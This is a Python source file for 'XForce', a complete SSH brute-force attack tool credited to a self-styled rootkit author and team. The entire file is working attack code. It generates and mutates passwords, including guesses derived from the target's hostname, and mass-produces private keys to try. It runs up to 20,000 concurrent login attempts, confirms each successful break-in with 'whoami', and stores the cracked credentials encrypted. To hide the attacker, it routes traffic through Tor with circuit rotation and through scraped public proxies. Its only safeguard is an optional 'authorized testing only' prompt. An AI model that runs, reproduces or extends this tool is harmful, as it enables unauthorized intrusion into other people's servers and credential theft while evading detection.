# Author: Hooked soul -NoneR00tk1t-
import socket
import random
import time
import asyncio
import aiohttp
import asyncssh
import logging
import logging.handlers
import sys
import base64
import os
import secrets
import pickle
import aiofiles
import async_timeout
import yaml
import re
from pathlib import Path
from typing import List, Optional, Dict
from tqdm.asyncio import tqdm_asyncio
import aiohttp_socks
from faker import Faker
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.asymmetric import rsa, ec, ed25519
from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption
from cryptography.fernet import Fernet
import psutil
import argparse
import string
import itertools
from concurrent.futures import ThreadPoolExecutor

try:
    from stem.control import Controller
except ImportError:
    Controller = None

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

try:
    import aiomultiprocess
except ImportError:
    aiomultiprocess = None


Path("logs").mkdir(exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.handlers.RotatingFileHandler(
            f'logs/XForce_{int(time.time())}.log',
            maxBytes=5_000_000,
            backupCount=100
        ),
        logging.StreamHandler(sys.stdout)
    ]
)
log = logging.getLogger(__name__)


class Proxy:
    def __init__(self, host: str, port: int, type: str = 'socks5', user: Optional[str] = None, pwd: Optional[str] = None):
        self.host = host
        self.port = port
        self.type = type
        self.user = user
        self.pwd = pwd
        self.latency = 999.0
        self.fails = 0
        self.succ = 0
        self.last = 0.0


class Stats:
    def __init__(self):
        self.att = 0
        self.succ = 0
        self.fail = 0
        self.err = 0
        self.start = time.time()
        self.rate = 0.0
        self.cpu = 0.0
        self.mem = 0.0
        self.proxy_ok = 0
        self.proxy_ko = 0
        self.tor_ok = 0
        self.tor_ko = 0


class XForce:
    def __init__(self, host: str, port: int = 22, cfg: Dict = None):
        self.host = self._validate_host(host)
        self.port = port
        self.cfg = cfg or {
            't': 1, 'r': 15, 'c': 20000, 'd': 0.0003, 'tor': True, 'tor_port': 9050,
            'keys': 10000, 'proxy_int': 8, 'min_pass': 3, 'batch': 1000, 'max_attempts': 5_000_000
        }
        self.timeout = self.cfg['t']
        self.retries = self.cfg['r']
        self.max_conn = self.cfg['c']
        self.delay = self.cfg['d']
        self.proxies: List[Proxy] = []
        self.active = 0
        self.found = []
        self.stop = asyncio.Event()
        self.lock = asyncio.Semaphore(self.max_conn)
        self.stats = Stats()
        self.cipher = self._init_cipher()
        self.tor = self.cfg['tor']
        self.tor_port = self.cfg['tor_port']
        self.tor_ctrl = None
        self.fake = Faker()
        self.success_patterns = []
        self.mutators = [
            lambda p: p + str(random.randint(1000, 9999999)),
            lambda p: p.capitalize() + random.choice(['!', '@', '#', '$', '%', '&', '*', '^']),
            lambda p: ''.join(c if random.random() > 0.05 else random.choice(['@', '0', '1', '!', '_', '-', '*', '^']) for c in p),
            lambda p: p + str(time.localtime().tm_year),
            lambda p: f"N{p}{random.randint(100, 999999)}",
            lambda p: p[::-1] + random.choice(['_', '.', '-', '*', '@', '!', '^']),
            lambda p: ''.join(random.choice([c.upper(), c.lower()]) for c in p),
            lambda p: p + secrets.token_hex(5),
            lambda p: f"{p[0].upper()}{p[1:-1]}{p[-1].upper()}",
            lambda p: self._ai_mutate(p, len(p))
        ]
        self.key_types = ['ed25519', 'ecdsa', 'rsa']
        self.executor = ThreadPoolExecutor(max_workers=500)
        if self.tor:
            asyncio.create_task(self._tor_init())

    def _validate_host(self, host: str) -> str:
        try:
            socket.gethostbyname(host)
        except:
            raise ValueError("Invalid host: cannot resolve")
        return host

    def _init_cipher(self):
        kfile = Path("XForce.key")
        if kfile.exists():
            return Fernet(kfile.read_bytes())
        k = base64.urlsafe_b64encode(PBKDF2HMAC(
            algorithm=hashes.SHA3_512(), length=256, salt=os.urandom(512), iterations=8_000_000
        ).derive(os.urandom(2048)))
        kfile.write_bytes(k)
        return Fernet(k)

    def _ai_mutate(self, p: str, length: int) -> str:
        if not self.success_patterns:
            return p
        base = random.choice(self.success_patterns[-10:] or [p])
        mix = base[:length//2] + p + base[length//2:]
        return ''.join(c for c in mix if c in string.printable)[:20]

    async def _tor_init(self):
        if not Controller:
            self.tor = False
            log.warning("Tor: stem not installed")
            return
        try:
            self.tor_ctrl = Controller.from_port(port=9051)
            self.tor_ctrl.authenticate()
            log.info("Tor: XForce online")
            asyncio.create_task(self._tor_renew())
        except Exception as e:
            self.tor = False
            log.warning(f"Tor: Offline ({e})")

    async def _tor_renew(self):
        while not self.stop.is_set():
            await asyncio.sleep(random.uniform(60, 120))
            if self.tor_ctrl:
                try:
                    self.tor_ctrl.signal('NEWCIRCUIT')
                except:
                    pass

    async def load_proxies(self, file: str):
        path = Path(file)
        if not path.exists():
            log.error(f"Proxy file not found: {file}")
            return
        for line in path.read_text(encoding='utf-8', errors='ignore').splitlines():
            m = re.match(r'(\S+):(\d+)(?::(\w+))?(?::(\S+))?(?::(\S+))?', line.strip())
            if m:
                self.proxies.append(Proxy(m.group(1), int(m.group(2)), m.group(3) or 'socks5', m.group(4), m.group(5)))
        await self._check_proxies()

    async def _check_proxies(self):
        async def test(p: Proxy):
            try:
                url = f"{p.type}://{f'{p.user}:{p.pwd}@' if p.user else ''}{p.host}:{p.port}"
                connector = aiohttp_socks.ProxyConnector.from_url(url)
                async with aiohttp.ClientSession(connector=connector) as s:
                    async with async_timeout.timeout(0.8):
                        t0 = time.time()
                        async with s.get('http://httpbin.org/ip') as r:
                            if r.status == 200:
                                p.latency = time.time() - t0
                                p.succ += 1
                                p.last = time.time()
                                self.stats.proxy_ok += 1
                                return True
            except:
                p.fails += 1
                self.stats.proxy_ko += 1
            return False
        if not self.proxies:
            return
        await asyncio.gather(*[test(p) for p in self.proxies], return_exceptions=True)
        self.proxies = [p for p in self.proxies if p.fails < 2 and p.latency < 0.8]

    async def _scrape_proxies(self):
        urls = [
            'https://www.proxy-list.download/api/v1/get?type=socks5',
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5',
            'https://proxylist.geonode.com/api/proxy-list?limit=300&sort_by=lastChecked&sort_type=desc',
        ]
        async with aiohttp.ClientSession() as s:
            for url in urls:
                try:
                    async with s.get(url, timeout=2) as r:
                        text = await r.text()
                        for m in re.findall(r'(\d+\.\d+\.\d+\.\d+):(\d+)', text):
                            self.proxies.append(Proxy(m[0], int(m[1]), 'socks5'))
                except:
                    pass
        await self._check_proxies()
        log.info(f"Scraped {len(self.proxies)} proxies")

    async def _get_proxy_command(self) -> Optional[str]:
        if self.tor and random.random() < 0.98:
            self.stats.tor_ok += 1
            return f"nc -X 5 -x 127.0.0.1:{self.tor_port} %h %p"

        good = [p for p in self.proxies if p.fails < 2 and p.succ > 0]
        if good:
            p = random.choices(good, weights=[1/(p.latency+0.0005) for p in good])[0]
            auth = f"{p.user}:{p.pwd}@" if p.user else ""
            return f"nc -X 5 -x {auth}{p.host}:{p.port} %h %p"
        return None

    async def _test_conn(self):
        for i in range(self.retries):
            try:
                proxy_cmd = await self._get_proxy_command()
                async with asyncssh.connect(
                    self.host, self.port,
                    connect_timeout=self.timeout,
                    known_hosts=None,
                    proxy_command=proxy_cmd
                ):
                    log.info(f"Target {self.host}:{self.port} locked")
                    return True
            except Exception:
                await asyncio.sleep(1.05 ** i * random.uniform(0.02, 0.15))
        log.error(f"Target {self.host}:{self.port} unreachable")
        return False

    async def _gen_key(self, ktype: str):
        loop = asyncio.get_running_loop()
        try:
            if ktype == 'rsa':
                key = await loop.run_in_executor(self.executor, lambda: rsa.generate_private_key(65537, 4096))
            elif ktype == 'ecdsa':
                key = await loop.run_in_executor(self.executor, lambda: ec.generate_private_key(ec.SECP384R1()))
            elif ktype == 'ed25519':
                key = await loop.run_in_executor(self.executor, lambda: ed25519.Ed25519PrivateKey.generate())
            else:
                return None
            return key.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption())
        except:
            return None

    async def connect(self, user: str, cred: str | bytes) -> bool:
        async with self.lock:
            if self.stats.att >= self.cfg['max_attempts']:
                self.stop.set()
                return False
            self.active += 1
            self.stats.att += 1
            tfile = None
            try:
                proxy_cmd = await self._get_proxy_command()
                kwargs = {
                    'host': self.host,
                    'port': self.port,
                    'username': user,
                    'connect_timeout': self.timeout,
                    'known_hosts': None,
                    'proxy_command': proxy_cmd,
                    'compression_algs': ['none'],
                    'preferred_auth': ['password', 'publickey']
                }
                if isinstance(cred, str):
                    kwargs['password'] = cred
                else:
                    tfile = Path(f"tmp_{secrets.token_hex(8)}.key")
                    tfile.write_bytes(cred)
                    kwargs['client_keys'] = [str(tfile)]

                async with asyncssh.connect(**kwargs) as conn:
                    res = await conn.run('whoami', check=True)
                    if user.strip().lower() == res.stdout.strip().lower():
                        enc = self.cipher.encrypt(
                            f"{user}:{'[KEY]' if isinstance(cred,bytes) else cred}:{time.time()}:{self.fake.user_agent()}".encode()
                        )
                        self.found.append(enc.decode())
                        self.stats.succ += 1
                        if isinstance(cred, str):
                            self.success_patterns.append(cred)
                        log.info(f"[+] HIT: {user}:{'[KEY]' if isinstance(cred,bytes) else '[PASS]'}")
                        await self._save()
                        return True
            except asyncssh.PermissionDenied:
                self.stats.fail += 1
            except Exception:
                self.stats.err += 1
                if self.tor:
                    self.stats.tor_ko += 1
            finally:
                self.active -= 1
                if tfile and tfile.exists():
                    tfile.unlink(missing_ok=True)
            return False

    async def _save(self):
        try:
            async with aiofiles.open("XForce_cache.pkl", "wb") as f:
                data = {
                    'found': self.found,
                    'stats': vars(self.stats),
                    'proxies': [(p.host, p.port, p.type, p.user, p.pwd, p.latency, p.fails, p.succ) for p in self.proxies],
                    'patterns': self.success_patterns
                }
                await f.write(self.cipher.encrypt(pickle.dumps(data)))
        except Exception as e:
            log.warning(f"Cache save failed: {e}")

    async def _load(self):
        p = Path("XForce_cache.pkl")
        if p.exists():
            try:
                async with aiofiles.open(p, "rb") as f:
                    data = pickle.loads(self.cipher.decrypt(await f.read()))
                    self.found = data.get('found', [])
                    self.success_patterns = data.get('patterns', [])
                    stats_dict = data.get('stats', {})
                    for k, v in stats_dict.items():
                        if hasattr(self.stats, k):
                            setattr(self.stats, k, v)
                    proxy_data = data.get('proxies', [])
                    self.proxies = [Proxy(p[0], p[1], p[2], p[3], p[4]) for p in proxy_data]
                    for i, pd in enumerate(proxy_data):
                        if i < len(self.proxies):
                            self.proxies[i].latency = pd[5]
                            self.proxies[i].fails = pd[6]
                            self.proxies[i].succ = pd[7]
                log.info("Cache loaded")
            except Exception as e:
                log.warning(f"Cache load failed: {e}")

    async def _monitor(self):
        while not self.stop.is_set():
            self.stats.cpu = psutil.cpu_percent()
            self.stats.mem = psutil.virtual_memory().percent
            self.stats.rate = self.stats.att / max(1, time.time() - self.stats.start)
            if self.stats.cpu > 99.9 or self.stats.mem > 99.9:
                log.warning(f"Overload: CPU {self.stats.cpu:.1f}% Mem {self.stats.mem:.1f}%")
                await asyncio.sleep(15)
            await asyncio.sleep(0.3)

    async def _proxy_maint(self):
        while not self.stop.is_set():
            await self._check_proxies()
            if len(self.proxies) < 200:
                await self._scrape_proxies()
            await asyncio.sleep(self.cfg['proxy_int'])

    def _generate_passwords(self, max_len: int = 12) -> List[str]:
        base = ['admin', 'root', 'test', 'guest', 'sysadmin', 'server', 'password']
        if self.host not in ['localhost', '127.0.0.1']:
            base.extend([self.host.split('.')[0], self.host.replace('.', '')])
        chars = string.ascii_letters + string.digits + '!@#$%^&*_-'
        passwords = set(base)
        for length in range(self.cfg['min_pass'], max_len + 1):
            for combo in itertools.islice(itertools.product(chars, repeat=length), 1000):
                passwords.add(''.join(combo))
        for b in base:
            passwords.add(b + str(random.randint(100, 9999)))
            passwords.add(b.capitalize() + random.choice(['!', '@', '#']))
            passwords.add(b + str(time.localtime().tm_year))
        return list(passwords)[:10000]

    def _mutate(self, p: str) -> List[str]:
        if len(p) < self.cfg['min_pass']:
            return []
        return list({m(p) for m in self.mutators})[:100]

    async def attack(self, users: List[str], passes: List[str], keys: bool = False):
        if not await self._test_conn():
            return False
        await self._load()
        if self.proxies:
            asyncio.create_task(self._proxy_maint())
        asyncio.create_task(self._monitor())

        creds = []
        if not passes:
            log.info("Generating dynamic passwords")
            passes = self._generate_passwords()
        for p in passes:
            creds.extend(self._mutate(p))
        creds = list(set(creds))[:self.cfg['max_attempts']]

        if keys:
            tasks = [self._gen_key(kt) for kt in self.key_types for _ in range(self.cfg['keys'] // len(self.key_types))]
            key_results = await asyncio.gather(*tasks, return_exceptions=True)
            creds.extend([k for k in key_results if isinstance(k, bytes)])

        random.shuffle(creds)
        tasks = [(u, c) for u in users for c in creds]

        async def worker(chunk):
            return await asyncio.gather(*(self.connect(u, c) for u, c in chunk), return_exceptions=True)

        batch_size = self.cfg['batch']
        total_batches = (len(tasks) + batch_size - 1) // batch_size

        if aiomultiprocess:
            async with aiomultiprocess.Pool(processes=16) as pool:
                for i in range(0, len(tasks), batch_size):
                    if self.stop.is_set():
                        break
                    chunk = tasks[i:i+batch_size]
                    await pool.apply(worker, (chunk,))
                    await asyncio.sleep(self.delay + random.uniform(0, 0.001))
        else:
            for i in tqdm_asyncio(range(0, len(tasks), batch_size), total=total_batches, desc="XForce", unit="batch"):
                if self.stop.is_set():
                    break
                chunk = tasks[i:i+batch_size]
                await worker(chunk)
                await asyncio.sleep(self.delay + random.uniform(0, 0.001))

        await self._export()
        return bool(self.found)

    async def _export(self):
        out = {
            'target': f"{self.host}:{self.port}",
            'time': time.strftime("%Y-%m-%d %H:%M:%S"),
            'stats': vars(self.stats),
            'creds': []
        }
        for b in self.found:
            try:
                decrypted = self.cipher.decrypt(b.encode()).decode()
                parts = decrypted.split(':')
                out['creds'].append({
                    'user': parts[0],
                    'cred': '[REDACTED]',
                    'time': parts[2],
                    'ua': parts[3]
                })
            except Exception:
                pass
        async with aiofiles.open("XForce_results.yaml", "w") as f:
            await f.write(yaml.safe_dump(out, sort_keys=False))
        log.info(f"Results: {len(self.found)} hits saved")




def load_list(file: str) -> List[str]:
    if not file:
        return []
    p = Path(file)
    if not p.exists():
        log.error(f"File missing: {file}")
        return []
    return [l.strip() for l in p.read_text(encoding='utf-8', errors='ignore').splitlines() if l.strip()]






async def main():
    parser = argparse.ArgumentParser(
        description="XForce - Final Linux SSH Bruteforce",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("host", help="Target host")
    parser.add_argument("-p", "--port", type=int, default=22)
    parser.add_argument("-u", "--user")
    parser.add_argument("-U", "--ulist")
    parser.add_argument("-P", "--pass", action="append", default=[], dest="pass_list")
    parser.add_argument("-W", "--wlist")
    parser.add_argument("--proxy")
    parser.add_argument("--tor", action="store_true")
    parser.add_argument("--keys", action="store_true")
    parser.add_argument("--confirm", action="store_true")
    parser.add_argument("-t", "--timeout", type=int, default=1)
    parser.add_argument("-r", "--retries", type=int, default=15)
    parser.add_argument("-c", "--conn", type=int, default=20000)
    parser.add_argument("-d", "--delay", type=float, default=0.0003)

    args = parser.parse_args()

    if args.confirm:
        print("\n[WARNING] Authorized testing only.")
        if input("Type 'YES' to continue: ").strip() != "YES":
            sys.exit(0)

    cfg = {
        't': args.timeout, 'r': args.retries, 'c': args.conn, 'd': args.delay,
        'tor': args.tor, 'tor_port': 9050, 'keys': 10000 if args.keys else 0
    }
    nk = XForce(args.host, args.port, cfg)

    if args.proxy:
        await nk.load_proxies(args.proxy)

    users = [args.user] if args.user else load_list(args.ulist)
    if not users:
        log.error("Provide -u or -U")
        sys.exit(1)

    passes = args.pass_list[:]
    if args.wlist:
        passes.extend(load_list(args.wlist))

    log.info(f"Target: {args.host}:{args.port} | Users: {len(users)} | Creds: {len(passes) or 'Dynamic'}")
    await nk.attack(users, passes, args.keys)
    log.info(f"Done: {nk.stats.succ} hits, {nk.stats.rate:.2f}/s")


def print_banner():
    print("""
[x] OPERATOR: [NoneR00tk1t]
[x] TEAM: [Valhala]
-------------------------------------
  ****           *   *
 *  *************  **
*     *********    **
*     *  *         **
 **  *  **         **
    *  ***         **  ***
   **   **         ** * ***
   **   **         ***   *
   **   **         **   *
   **   **         **  *
    **  **         ** **
     ** *      *   ******
      ***     *    **  ***
       *******     **   *** *
         ***        **   ***
-------------------------------------
""")


if __name__ == "__main__":
    print_banner()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Stopped by user")
    finally:
        log.info("XForce shutdown")